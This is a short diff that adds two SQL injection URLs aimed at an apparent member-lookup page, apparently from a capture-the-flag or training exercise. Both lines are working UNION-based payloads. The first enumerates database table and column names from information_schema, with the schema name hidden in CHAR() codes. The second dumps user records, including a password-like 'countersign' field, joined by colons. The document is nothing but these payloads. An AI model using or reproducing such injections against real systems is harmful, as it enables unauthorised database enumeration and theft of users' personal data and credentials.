@@ -1,0 +1,2 @@
+/index.php?page=member&Submit=Submit&id=-1+union+select+TABLE_NAME,COLUMN_NAME+from+information_schema.COLUMNS+WHERE+TABLE_SCHEMA=CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)
+/index.php?page=member&Submit=Submit&id=-1+union+select+1,CONCAT(user_id,CHAR(58),first_name,CHAR(58),last_name,CHAR(58),town,CHAR(58),country,CHAR(58),planet,CHAR(58),Commentaire,CHAR(58),countersign)+from+users
